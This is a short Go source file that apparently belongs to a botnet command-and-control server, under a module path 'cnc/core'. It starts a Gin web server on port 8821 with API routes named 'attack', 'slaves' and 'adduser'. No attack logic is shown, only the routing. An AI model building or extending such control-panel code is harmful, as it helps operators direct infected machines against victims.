package api

import (
	endpoints2 "cnc/core/api/endpoints"
	"cnc/core/config"
	"github.com/gin-gonic/gin"
	"log"
)

func Serve() {
	if config.Config.Api.Enabled {
		r := gin.Default()
		gin.SetMode(gin.ReleaseMode)

		api := r.Group("/api")
		api.GET("/attack", endpoints2.Attack)
		api.GET("/slaves", endpoints2.Slaves)
		api.GET("/adduser", endpoints2.Adduser)

		if err := r.Run(":8821"); err != nil {
			log.Fatal(err)
		}
	}
}
